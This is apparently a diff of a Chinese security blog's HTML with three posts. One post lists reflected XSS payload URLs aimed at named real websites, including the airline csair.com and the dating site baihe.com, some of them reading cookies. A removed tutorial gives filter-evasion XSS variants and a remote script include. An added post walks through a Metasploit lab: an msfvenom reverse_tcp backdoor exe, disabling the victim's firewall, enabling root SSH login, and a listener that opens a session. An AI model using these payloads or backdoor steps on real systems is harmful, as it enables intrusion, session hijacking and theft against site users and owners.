@@ -293,311 +293,64 @@
       
         
           
-            <h1 id="xss实战"><a href="#xss实战" class="headerlink" title="xss实战"></a>xss实战</h1><h4 id="百合网"><a href="#百合网" class="headerlink" title="百合网"></a><strong>百合网</strong></h4><p><a href="http://www.baihe.com/betatest/betatest_newlandpage.html?policy=1&Channel=baidu&Code=ppcbh001" target="_blank" rel="noopener"><strong>http://www.baihe.com/betatest/betatest_newlandpage.html?policy=1&amp;Channel=baidu&amp;Code=ppcbh001</strong></a></p>
-<h2 id><a href="#" class="headerlink" title></a><img src="/10/xss实战/C:%5CUsers%5CLENOVO%5Cmyblog%5Csource_posts%5Cxss%E5%AE%9E%E6%88%98%5C1.png" alt></h2> <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+            <h1 id="xss实战"><a href="#xss实战" class="headerlink" title="xss实战"></a>xss实战</h1><h4 id="百合网"><a href="#百合网" class="headerlink" title="百合网"></a>百合网</h4><p>首页： <a href="http://www.baihe.com/betatest/betatest_newlandpage.html?policy=1&amp;Channel=baidu&amp;Code=ppcbh00" target="_blank" rel="noopener">http://www.baihe.com/betatest/betatest_newlandpage.html?policy=1&amp;Channel=baidu&amp;Code=ppcbh00</a></p>
+<hr>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=c%3Cscript%3Ealert(/xss/)%3C/script%3E
 
 
 
-[**http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=c%3Cscript%3Ealert(/xss/)%3C/script%3E**]
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+
+http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=calert(/xss/)
 
 
 
-(http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=calert(/xss/))
-
-
-
-![img](C:\Users\LENOVO\myblog\source\_posts\xss实战\2..png)
-
-\-----------------------------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
 
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/1/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-
-
-<p><a href="http://u.baihe.com/index/getJYadvs?jsonCallBack=alert(/1/)" target="_blank" rel="noopener"><strong>http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(/1/)%3C/script%3E</strong></a></p>
-<p><img src="/10/xss实战/C:%5CUsers%5CLENOVO%5Cmyblog%5Csource_posts%5Cxss%E5%AE%9E%E6%88%98%5C3.png" alt="img"></p>
+<p><a href="http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(/1/)%3C/script%3E**](http://u.baihe.com/index/getJYadvs?jsonCallBack=alert(/1/)]" target="_blank" rel="noopener">http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(/1/)%3C/script%3E**](http://u.baihe.com/index/getJYadvs?jsonCallBack=alert(/1/)]</a>( <a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> )</p>
 <hr>
  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(%0ddocument%0a.%09cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
+http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(%0ddocument%0a.%09cookie);%3C/script%3E
 
 
-**http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(%0ddocument%0a.%09cookie);%3C/script%3E**
-
-
-
-![img](C:\Users\LENOVO\myblog\source\_posts\xss实战\Y1[D8MBLFRC266L29CMLH@X.png)
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
 
-http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=%3Cscript%3Ealert(%0ddocument%0a.%09cookie);%3C/script%3E
+ http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=%3Cscript%3Ealert(%0ddocument%0a.%09cookie);%3C/script%3E
 
 
-
-![img](C:\Users\LENOVO\myblog\source\_posts\xss实战\5.png)
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
 
-#### **HK携程**
+HK携程
 
-[https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C%2Fscript%3E](https://hk.trip.com/travel-guide/search/?keyword=alert(%2Fxss%2F)<%2fscript>)
+https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C%2Fscript%3E
 
 
-
-![img](C:\Users\LENOVO\myblog\source\_posts\xss实战\7.png)
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
 
-#### **房天下**
+房天下
 
  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-
-
 <p><a href="https://yz.esf.fang.com/map/" target="_blank" rel="noopener">https://yz.esf.fang.com/map/</a></p>
-<p><img src="/10/xss实战/C:%5CUsers%5CLENOVO%5Cmyblog%5Csource_posts%5Cxss%E5%AE%9E%E6%88%98%5C3XT6~V341%7DHG.png" alt="img"></p>
 <hr>
-<h4 id="中国南方航空"><a href="#中国南方航空" class="headerlink" title="中国南方航空"></a><strong>中国南方航空</strong></h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><a href="https://b2c.csair.com/portal/minPrice/queryMinPriceInAirLines?jsoncallback=alert(/xss/)&inter=Y" target="_blank" rel="noopener">https://b2c.csair.com/portal/minPrice/queryMinPriceInAirLines?jsoncallback=%3Cscript%3Ealert(/xss/)%3C/script%3E&amp;inter=Y</a></p>
-<p><img src="/10/xss实战/C:%5CUsers%5CLENOVO%5Cmyblog%5Csource_posts%5Cxss%E5%AE%9E%E6%88%98%5CBN7P51%5B@AXI6.png" alt="img"></p>
-<hr>
-<p><a href="https://www.zhuego.com/index.php?m=search&a=product&key=alert(%2Fxss%2F)<%2Fscript>" target="_blank" rel="noopener">https://www.zhuego.com/index.php?m=search&amp;a=product&amp;key=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E</a></p>
-<p><img src="/10/xss实战/C:%5CUsers%5CLENOVO%5Cmyblog%5Csource_posts%5Cxss%E5%AE%9E%E6%88%98%5C7bf86120c7d7fd0024724d3e9688d96.png" alt="img"></p>
-<hr>
-<p><a href="http://www.ruigushop.com/Channel/index.html?search=PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=#sAnchor" target="_blank" rel="noopener">http://www.ruigushop.com/Channel/index.html?search=PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=#sAnchor</a></p>
-<p><img src="/10/xss实战/C:%5CUsers%5CLENOVO%5Cmyblog%5Csource_posts%5Cxss%E5%AE%9E%E6%88%98%5CK66%HID%5BV3C1.png" alt="img"></p>
-</%2fscript>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="blog.shenzihao.top/2019/08/10/XSS/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="申子昊">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/1.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="changyouB-log">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/10/XSS/" itemprop="url">XSS简介</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-10T19:11:36+08:00">
-                2019-08-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p>一、XSS简介<br>二、XSS漏洞的危害<br>三、XSS漏洞的类型<br>四、XSS的构造<br>五、XSS的变形</p>
-<p>六、Shellcode的调用</p>
-<h5 id="一、XSS-owasp-top-10-之一"><a href="#一、XSS-owasp-top-10-之一" class="headerlink" title="一、XSS owasp top 10 之一"></a>一、XSS owasp top 10 之一</h5><p>XSS 跨站脚本攻击 Cross Site Script(ing) css (层叠样式表)<br>XSS 所用的攻击代码主要是Javascript 将恶意代码注入到网页中<br>JS能够做到的事情，就是可能受到攻击<br>XSS 攻击的是用户、浏览器、客户端、微博留言板的位置，有收集用户输入的地方，都有可</p>
-<p>能遭受XSS的攻击</p>
-<h5 id="二、盗取各种用户账号"><a href="#二、盗取各种用户账号" class="headerlink" title="二、盗取各种用户账号"></a>二、盗取各种用户账号</h5><p>窃取用户cookie资料，冒充用户身份进入网站<br>劫持用户会话，执行任意操作<br>刷流量，执行弹窗广告</p>
-<p>传播蠕虫病毒</p>
-<h5 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h5> <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(%0ddocument%0a.%09cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
- <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>
-
- <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;%<span class="number">09</span>alert%<span class="number">09</span>(<span class="number">1</span>);&lt;script&gt; </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;%0dalert%0d(1);&lt;/script&gt; </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;%0aalert%0a(1);&lt;/script&gt; </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document%0a.%09cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(%0ddocument%0a.%09cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=&lt;a/herf=%<span class="number">27</span>javascri%<span class="number">09</span>pt:alert(<span class="number">1</span>)%<span class="number">27</span>&gt;<span class="number">123</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=<span class="string">'x'</span>/onerror%<span class="number">0</span>A= alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure>
-<p>只要浏览器弹框，就意味着JS代码可以被执行，就可以执行其他语句。</p>
-<p>要想弹框，最好能让浏览器识别<script>标签</p>
-<h5 id="三、XSS漏洞的类型"><a href="#三、XSS漏洞的类型" class="headerlink" title="三、XSS漏洞的类型"></a>三、XSS漏洞的类型</h5><h6 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h6><p>非持久性、参数型跨站脚本<br>搜索框、用户登录的地方</p>
-<p>窃取用户cookie或进行钓鱼欺骗</p>
-<h6 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h6><p>持久性跨站脚本，更具有威胁性、恶意代码存储在数据库、其他文件等地方<br>留言板、评论、博客日志</p>
-<p>渗透网站、挂马、蠕虫病毒、钓鱼</p>
-<h6 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h6><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">          var pos=document.URL.indexOF(<span class="string">"context="</span>)+<span class="number">8</span></span><br><span class="line">        document.write(decodeURL(document.URL.substring(pos,document.URL.length)))</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>更改原来文档的DOM树</p>
-<h5 id="四、XSS的构造"><a href="#四、XSS的构造" class="headerlink" title="四、XSS的构造"></a>四、XSS的构造</h5><p>不同的浏览器效果不一样，同一款浏览器，不同版本之间效果不一样</p>
-<p>利用<>构造HTML/JavaScript  如果用户可以随心所欲的引入<>等标记，那么他就能操作一个HTML标签，然后通过<script>标签就能输入任意由JavaScript或VBscript编写的恶意脚本代码</p>
-<p>利用HTML标签的属性值进行XSS HTML中有标签，标签中有属性，属性有属性值。有的HTML标签属性值，支持Javascript:[code]</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript:alert(/xss/)"</span>&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-
-产生自己的事件 事件就是用户何时做了什么事情 处理相关事件的语句，事件响应函数
-我们把事件分为3个不同类型
-
-###### 用户接口（鼠标键盘）
-
-###### 逻辑（处理的结果）
-
-###### 变化（对文档的修改）
-
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=<span class="string">'x'</span>/onerror%<span class="number">0</span>A= alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure>
-
+<p>中国南方航空</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;*img src=<span class="string">"./1.jpg"</span> onmouseover=<span class="string">"alert(/xss/)"</span>&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">"text"</span> onkeydown=<span class="string">"alert(/xss/)"</span>&gt;</span><br></pre></td></tr></table></figure>
-
-利用CSS跨站（不太常见）使用范围比较窄
-
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;from method=<span class="string">"post"</span> action=<span class="string">"xss.php"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;figure class="highlight cpp"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre&gt;&lt;span class="line"&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;span class="line"&gt;&amp;lt;textarea name=&lt;span class="string"&gt;"text"&lt;/span&gt;&amp;gt;&amp;lt;/textarea&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</span><br><span class="line"></span><br><span class="line">&lt;input typa=<span class="string">"submit"</span> name=<span class="string">"sumbit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/from&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_post['submit']))&#123;</span><br><span class="line">echo $_post['text'];</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">echo<span class="string">"sorry"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="五、XSS的变形"><a href="#五、XSS的变形" class="headerlink" title="五、XSS的变形"></a>五、XSS的变形</h5><h6 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h6><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img sRc=<span class="string">'#'</span> Onerror=<span class="string">"alert(/xss/)"</span>/&gt;</span><br></pre></td></tr></table></figure>
-
-###### 引号的使用
-
-###### 无引号
-
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img sRc=# Onerror=alert(/xss/)/&gt;</span><br></pre></td></tr></table></figure>
-
-<h6 id="单引号"><a href="#单引号" class="headerlink" title="单引号"></a>单引号</h6><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img sRc=<span class="string">'#'</span> Onerror=alert(/xss/)/&gt;</span><br></pre></td></tr></table></figure>
-
-###### 双引号
-
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img sRc=<span class="string">"#"</span> Onerror=alert(/xss/)/&gt;</span><br></pre></td></tr></table></figure>
-
-<p>利用/代替空格</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img/sRc=“#” Onerror=alert(/xss/)/&gt;</span><br></pre></td></tr></table></figure>
-
-##### CSS中的变形
-
-###### 使用全角字符
-
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;body&#123;background-image:expre<span class="comment">/***/</span>ssion(alert(<span class="number">1</span>);&#125;&lt;/style&gt;</span><br></pre></td></tr></table></figure>
-
-<h6 id="注释会被浏览器忽略"><a href="#注释会被浏览器忽略" class="headerlink" title="注释会被浏览器忽略"></a>注释会被浏览器忽略</h6><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;body&#123;background-image:expression(alert(<span class="number">1</span>);&#125;&lt;/style&gt;</span><br></pre></td></tr></table></figure>
-
-###### 样式表中的\和\0同样会被浏览器忽略
-
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;@import'javasc\ri\0pt:alert("xss")';&lt;/style&gt;</span><br></pre></td></tr></table></figure>
-
-<h6 id="Tab与Enter"><a href="#Tab与Enter" class="headerlink" title="Tab与Enter"></a>Tab与Enter</h6><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ImgsRc=<span class="string">'#'</span> Onerror	=alert(/xss/)/&gt;&gt;</span><br></pre></td></tr></table></figure>
-
-##### 对标签属性值进行转码
-##### 拆分跨站
-
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z='alert'&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=z+'(/xss/)'&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
+<p><a href="https://b2c.csair.com/portal/minPrice/queryMinPriceInAirLines?jsoncallback=%3Cscript%3Ealert(/xss/)%3C/script%3E&amp;inter=Y" target="_blank" rel="noopener">https://b2c.csair.com/portal/minPrice/queryMinPriceInAirLines?jsoncallback=%3Cscript%3Ealert(/xss/)%3C/script%3E&amp;inter=Y</a></p>
 <hr>
-<h5 id="六、Shellcode的调用"><a href="#六、Shellcode的调用" class="headerlink" title="六、Shellcode的调用"></a>六、Shellcode的调用</h5><p>ShellCode最初是指溢出程序和蠕虫病毒的核心，实际上是指利用一个漏洞所执行的代码<br>Exploit的英文意思是利用，通常表示完整的编写好的漏洞利用工具（或程序）Exploit往往包含来了ShellCode</p>
-<p>Poc proof of concept 的缩写，是一段证明漏洞存在的程序代码片段</p>
-<p>动态远程调用JS</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src =<span class="string">"http://ip/a.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
+<p><a href="https://www.zhuego.com/index.php?m=search&amp;a=product&amp;key=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E" target="_blank" rel="noopener">https://www.zhuego.com/index.php?m=search&amp;a=product&amp;key=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E</a></p>
 <hr>
-<h5 id="windows-location-hash"><a href="#windows-location-hash" class="headerlink" title="windows.location.hash"></a>windows.location.hash</h5><h5 id="XSS-DOWNLODER"><a href="#XSS-DOWNLODER" class="headerlink" title="XSS DOWNLODER"></a>XSS DOWNLODER</h5><p>将ShellCODE存储到网站的数据库中，包括网页信息、文章内容、个人资料存储的地方，然后再把它下载下来执行<br>简单来说就是构造一个XSS下载器事先把Shellcode写在网站的某一个页面</p>
-<p>再利用XMLHTTP控件向网站发送HTTP请求然后执行返回数据</p>
-<p>备选存储技术</p>
-<p>另外一种方法是把XSS SHELLCODE 存储在客户端本地域中，如HTTPCOOKIE FISH共享对象 USEDATE</p>
-<h5 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h5></script></p>
+<p><a href="http://www.ruigushop.com/Channel/index.html?search=PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=#sAnchor" target="_blank" rel="noopener">http://www.ruigushop.com/Channel/index.html?search=PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=#sAnchor</a></p>
+<hr>
+
           
         
       
@@ -3245,6 +2998,192 @@ ls --help | less     //查看ls的帮助信息,并分页显示(less更智能,可
 
 
     
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="blog.shenzihao.top/2019/08/09/metasploit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="申子昊">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="changyouB-log">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/09/metasploit/" itemprop="url">metasploit之后门的生成</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-09T17:56:41+08:00">
+                2019-08-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="后门简介"><a href="#后门简介" class="headerlink" title="后门简介"></a>后门简介</h2><p>后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。etasploit可以生成多种多样的后门，比如windows、linux、java、php等。</p>
+<hr>
+<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>Kali linux ip 192.168.10.128  </p>
+<p>WIN7 ip 10.0.2.2 </p>
+<hr>
+<p>选择以下攻击载荷并生成一个exe的木马程序</p>
+<p>命令msfconsole 开启Metasploit</p>
+<p>查看payload，使用命令show payloads，msf提供了多种攻击载荷</p>
+<p>选择以下攻击载荷（使用TAB键自动补全），并生成一个exe的木马程序</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.128 lport=4444 -f exe -o /123.exe</p>
+<p>其中，lhost为kali linx的IP地址 生成的exe文件存放在根目录下</p>
+<hr>
+<p><strong>使用命令 cd /，可以看到我们生成的exe文件</strong></p>
+<hr>
+<p>接下来，我们需要把生成的exe文件伪装成其他文件发送到目标机上。由于实验机环境限制，为了把我们生成的exe上传到目标机上，这里我们需要使用Putty这个工具，将生成的exe文件传到win7虚拟机上。</p>
+<hr>
+<p>为了不出现连接被拒绝的情况，我们首先要在kali linux上打开ssh服务，并且关闭win7防火墙。</p>
+<p>在kali linux上打开ssh服务的方法：</p>
+<p>apt-get install openssh-server#安装</p>
+<p>一、配置SSH参数</p>
+<p>修改sshd_config文件，命令为：</p>
+<p>vi /etc/ssh/sshd_config</p>
+<p>将#PasswordAuthentication no的注释去掉，并且将NO修改为YES，kali中默认是yes</p>
+<p>右击桌面，单击打开终端，输入命令</p>
+<p>将PermitRootLogin without-password修改为</p>
+<p>PermitRootLogin yes</p>
+<p>二、启动SSH服务</p>
+<p>命令为：</p>
+<p>/etc/init.d/ssh start</p>
+<p>或者</p>
+<p>service ssh start</p>
+<p>查看SSH服务状态是否正常运行，命令为</p>
+<p>/etc/init.d/ssh status</p>
+<p>或者service ssh status</p>
+<p>那么需要生成两个密钥：</p>
+<p>ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</p>
+<p>ssh-keygen -t dsa -f /etc/ssh/ssh_host_rsa_key</p>
+<p>执行命令后都会让输入密码，直接敲回车设置为空即可</p>
+<hr>
+<p><strong>Win7关闭防火墙的方法</strong></p>
+<hr>
+<p>接着打开win7上win+R输入psftp.exe，使用命令 open192.168.10.128  ，连接到kali linux，使用cd /跳转到根目录下，使用命令get 文件名把文件下载到本地。</p>
+<hr>
+<p>在msf中设置监听</p>
+<p>use exploit/multi/handler </p>
+<p>show options </p>
+<p>设置我们后门生成时的攻击载荷</p>
+<p>set payload windows/meterpreter/reverse_tcp</p>
+<p>show options </p>
+<p>set payload windows/meterpreter/reverse_tcp</p>
+<p>payload =&gt; windows/meterpreter/reverse_tcp</p>
+<hr>
+<p>设置参数（与后门的参数相对应）</p>
+<p>msf exploit(multi/handler) &gt; set LHOST 192.168.10.128</p>
+<p>LHOST =&gt; 192.168.10.128</p>
+<p>msf exploit(multi/handler) &gt; set LPORT 4444</p>
+<p>LPORT =&gt; 4444</p>
+<p>msf exploit(multi/handler) &gt; run</p>
+<hr>
+<p>在windows主机上点击123.exe。当被攻击者运行了我们上传的后门程</p>
+<p>序时，会弹回一个shell</p>
+<p>[*] Started reverse TCP handler on 192.168.10.128:4444 </p>
+<p>[*] Sending stage (179779 bytes) to 192.168.10.1</p>
+<p>[*] Sleeping before handling stage…</p>
+<p>[*] Meterpreter session 1 opened (192.168.10.128:4444 -&gt; 192.168.10.1:53292) at 2019-07-28 14:08:08 +0800</p>
+<hr>
+<hr>
+<h3 id="实验结束"><a href="#实验结束" class="headerlink" title="实验结束"></a>实验结束</h3>
+          
+        
+      
